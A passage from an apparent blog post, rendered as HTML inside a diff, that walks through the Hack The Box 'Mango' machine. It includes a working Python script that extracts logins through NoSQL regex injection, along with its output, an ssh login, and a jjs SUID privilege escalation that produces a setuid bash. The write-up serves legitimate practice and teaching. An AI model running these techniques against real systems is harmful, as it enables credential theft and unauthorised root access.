+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
+            <span class="n">params</span><span class="p">[</span><span class="s">"password[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="s">".*"</span>
+            <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">pr</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+                <span class="n">password</span> <span class="o">+=</span> <span class="n">c</span>
+                <span class="k">break</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="n">possible_chars</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Found password "</span><span class="o">+</span><span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">+</span><span class="s">" for username "</span><span class="o">+</span><span class="n">username</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">password</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_usernames</span><span class="p">():</span>
+    <span class="n">usernames</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"username[$regex]"</span><span class="p">:</span><span class="s">""</span><span class="p">,</span> <span class="s">"password[$regex]"</span><span class="p">:</span><span class="s">".*"</span><span class="p">,</span> <span class="s">"login"</span><span class="p">:</span> <span class="s">"login"</span><span class="p">}</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="s">"^"</span> <span class="o">+</span> <span class="n">c</span>
+        <span class="n">params</span><span class="p">[</span><span class="s">"username[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="s">".*"</span>
+        <span class="n">pr</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">pr</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"Found username starting with "</span><span class="o">+</span><span class="n">c</span><span class="p">)</span>
+            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="k">for</span> <span class="n">c2</span> <span class="ow">in</span> <span class="n">possible_chars</span><span class="p">:</span>
+                    <span class="n">params</span><span class="p">[</span><span class="s">"username[$regex]"</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">c2</span> <span class="o">+</span> <span class="s">".*"</span>
+                    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>                                      
+                        <span class="n">username</span> <span class="o">+=</span> <span class="n">c2</span>                                                                                                                                                      
+                        <span class="k">print</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+                        <span class="k">break</span>
+
+                <span class="k">if</span> <span class="n">c2</span> <span class="o">==</span> <span class="n">possible_chars</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+                    <span class="k">print</span><span class="p">(</span><span class="s">"Found username: "</span><span class="o">+</span><span class="n">username</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+                    <span class="n">usernames</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">1</span><span class="p">:])</span>
+                    <span class="k">break</span>
+    <span class="k">return</span> <span class="n">usernames</span>
+
+
+<span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">get_usernames</span><span class="p">():</span>
+    <span class="n">get_password</span><span class="p">(</span><span class="n">u</span><span class="p">)</span></code></pre></figure>
+
+<p>Running the script we get this output:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python post-brute.py
+Found username starting with a
+^ad
+^adm
+^admi
+^admin
+Found username: admin
+Found username starting with m
+^ma
+^man
+^mang
+^mango
+Found username: mango
+Extracting password of admin
+Found password t9......#2 <span class="k">for </span>username admin
+Extracting password of mango
+Found password h3......5H <span class="k">for </span>username mango</code></pre></figure>
+
+<p>We have found two usernames <code class="highlighter-rouge">admin</code> and <code class="highlighter-rouge">mango</code> as well as two passwords.</p>
+
+<p>Since we know that the <code class="highlighter-rouge">ssh</code> port is open let’s go try and login using our new found credentials.</p>
+
+<p>We find that only the user <code class="highlighter-rouge">mango</code> seems to have <code class="highlighter-rouge">ssh</code> access:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh mango@mango.htb
+mango@mango.htbs password: 
+Last login: Sat Apr 18 05:09:39 2020 from 10.10.14.7
+mango@mango:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 0</code></pre></figure>
+
+<p>However, we do not find the <code class="highlighter-rouge">user.txt</code> flag.</p>
+
+<p>Let’s try accessing <code class="highlighter-rouge">admin</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mango@mango:~<span class="nv">$ </span>su admin
+Password: 
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>4000000000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>admin<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">pwd</span>
+/home/mango
+<span class="nv">$ </span><span class="nb">cat</span> ~/user.txt
+79bf31c6c6.....f7f8b47e92</code></pre></figure>
+
+<p>We have our <code class="highlighter-rouge">user</code> flag! Next we go for <code class="highlighter-rouge">root</code>.</p>
+
+<h2 id="root">Root</h2>
+
+<p>Now that we have access to two accounts let’s see if either have <code class="highlighter-rouge">sudo</code> privileges by using the <code class="highlighter-rouge">-l</code> flag.</p>
+
+<p>We find that both uers get the message <code class="highlighter-rouge">Sorry, user &lt;username&gt; may not run sudo on mango</code>.</p>
+
+<p>So we have a few options here. We can either look for exploits or look for scripts/programs we can run with <code class="highlighter-rouge">root</code> privileges.</p>
+
+<p>Given that when logging in we noticed the OS to be <code class="highlighter-rouge">Ubuntu 18.04.2</code> and has minimal uninstalled security updates we will have a search for scripts/programs first.</p>
+
+<p>Because we are wanting a script owned by <code class="highlighter-rouge">root</code> but can be run by <code class="highlighter-rouge">admin</code> we will use the <code class="highlighter-rouge">find</code> command searching for anything that is owned by <code class="highlighter-rouge">root</code> but gives permissions to users in the <code class="highlighter-rouge">admin</code> group like so:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">find / <span class="nt">-regextype</span> posix-extended <span class="nt">-regex</span> <span class="s2">"/(sys|srv|proc|run)"</span> <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-user</span> root <span class="nt">-group</span> admin <span class="nt">-ls</span> 2&gt;&amp;1 | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Permission denied"</span>
+274666     12 <span class="nt">-rwsr-sr--</span>   1 root     admin       10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code></pre></figure>
+
+<p>Bingo! We find a program that we have access to.</p>
+
+<p>Taking a look at <a href="https://gtfobins.github.io">GTFOBins</a> we see we can use <code class="highlighter-rouge">jjs</code> to gain root privileges.</p>
+
+<p>However, we do not have <code class="highlighter-rouge">sudo</code> privileges and the <code class="highlighter-rouge">SUID</code> method only works on <em>macOS</em>.</p>
+
+<p>Attempting to use the <code class="highlighter-rouge">reverse shell</code> method we find that our session freezes and is unusable.</p>
+
+<p>What we can do is read a file which we can use to read <code class="highlighter-rouge">/root/root.txt</code> but that is no fun.</p>
+
+<p>Instead we will use a combination of <em>GTFOBins</em> using <code class="highlighter-rouge">jjs</code> and <code class="highlighter-rouge">bash</code> like so:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/bash /tmp/bash').waitFor()"</span> | jjs
+jjs&gt; Java.type<span class="o">(</span><span class="s1">'java.lang.Runtime'</span><span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s1">'cp /bin/bash /tmp/bash'</span><span class="o">)</span>.waitFor<span class="o">()</span>
+0
+<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Java.type('java.lang.Runtime').getRuntime().exec('chmod +s /tmp/bash').waitFor()"</span> | jjs
+jjs&gt; Java.type<span class="o">(</span><span class="s1">'java.lang.Runtime'</span><span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s1">'chmod +s /tmp/bash'</span><span class="o">)</span>.waitFor<span class="o">()</span>
+0
+<span class="nv">$ </span>/tmp/bash <span class="nt">-p</span>
+bash-4.4# <span class="nb">cat</span> /root/root.txt
+8a8ef79a7a....8424e9ab15</code></pre></figure>
+
+<p>And there we have it… another machine rooted!</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Mango was an interesting machine and points out real world dangers with using <em>PHP Mongo adapters</em> as well giving incorrect permissions to programs.</p>
+
+<p>While reviewing this writeup and looking down other paths there are some serious potential for rabbitholes at every turn. From the <em>Flexmonster</em> analytics page that led to a <em>GitHub</em> repo I noticed <em>LinkedIn</em> company profiles, blogs, social accounts… the works. Some people may have lost more than a few hairs along the way!</p>
+<!-- Hack The Box Badge -->
+          <p class="text-center" style="padding-top: 10px;"><img src="https://www.hackthebox.eu/badge/image/195745" alt="Hack The Box"></p></main>
+      </div>
+    </div>
+    <!-- Bootstrap core JavaScript -->
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
+    <script src="/assets/js/bootstrap.bundle.min.js"></script>
+    <!-- Custom JavaScript -->
+    <script src="/assets/js/sabe.js"></script>
+    <!-- Lightbox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.min.js"></script>
+    <script>
+      $(document).on('click', '[data-toggle="lightbox"]', function(event) {
+        event.preventDefault();
+        $(this).ekkoLightbox();
+      });
+    </script>
+  </body>
+</html>
